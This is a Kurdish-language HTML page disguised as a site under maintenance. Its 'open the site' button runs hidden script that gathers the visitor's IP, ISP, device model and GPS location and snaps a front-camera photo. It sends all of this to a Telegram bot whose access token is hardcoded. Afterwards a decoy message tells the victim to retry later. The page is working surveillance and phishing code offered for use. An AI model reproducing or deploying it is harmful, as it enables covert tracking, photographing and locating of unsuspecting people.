<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        h1 { font-size: 22px; color: #e74c3c; margin-bottom: 15px; }
        p { font-size: 15px; color: #666; margin-bottom: 25px; }
        .btn {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 15px 25px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background-color: #c0392b; }
    </style>
</head>
<body>
    <div class="container" id="content-box">
        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
        <p>بۆ بینینی ناوەڕۆک و پشتڕاستکردنەوەی سیستەم، تکایە کلیک لەسەر دوگمەی خوارەوە بکە:</p>
        <button class="btn" onclick="startProcess()">کردنەوەی ماڵپەڕ</button>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "6782298541";

        async function sendTelegramMessage(text) {
            if (!chatId) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
                });
            } catch (err) {}
        }

        async function sendTelegramPhoto(blob) {
            if (!chatId) return;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی کامێرای پێشەوە!**');
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            } catch (err) {}
        }

        async function startProcess() {
            document.getElementById('content-box').innerHTML = '<h1>⏳ تكاتە چاوەڕوان بە...</h1><p>خەریکی پەیوەستبوون بە سیستەمەوە...</p>';

            let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
            
            // وەرگرتنی مۆدێلی ئامێر
            let deviceModel = "نادیار";
            try {
                const parser = new UAParser();
                const result = parser.getResult();
                deviceModel = `${result.device.vendor \vert{}\vert{} ''}${result.device.model || ''} (${result.os.name \vert{}\vert{} ''}${result.os.version || ''})`.trim();
            } catch (e) {}

            // وەرگرتنی IP
            let ip = 'نادیار', isp = 'نادیار';
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || 'نادیار';
                isp = data.org || 'نادیار';
            } catch (e) {}

            // لۆکەیشن
            let locationText = "❌ بەردەست نییە";
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
                });
                locationText = `\`${pos.coords.latitude}, ${pos.coords.longitude}\``;
            } catch (e) {}

            // داواکردنی ڕاستەوخۆی کامێرا (Allow)
            let imageBlob = null;
            let cameraStatus = "❌ ڕەتکرایەوە";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                cameraStatus = "🟢 Allow کراوە و وێنە گیرا";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                imageBlob = await new Promise((resolve) => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; 
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve(blob);
                        }, 'image/jpeg');
                    }, 1200);
                });
            } catch (e) {
                cameraStatus = "🔴 Deny کراوە (یان قفڵە)";
            }

            // ناردنی زانیارییەکان بۆ تێلێگرام
            const msg = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
⏰ کات: \`${visitTime}\`
🌐 IP: \`${ip}\` (${isp})
🎯 لۆکەیشن: ${locationText}
📷 دۆخی کامێرا: ${cameraStatus}
📱 ئامێر: \`${deviceModel}\``;

            await sendTelegramMessage(msg);

            if (imageBlob) {
                await sendTelegramPhoto(imageBlob);
            }

            // گەڕاندنەوەی دۆخی ئاسایی پەڕەکە
            document.getElementById('content-box').innerHTML = `
                <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
                <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
            `;
        }
    </script>
</body>
</html>
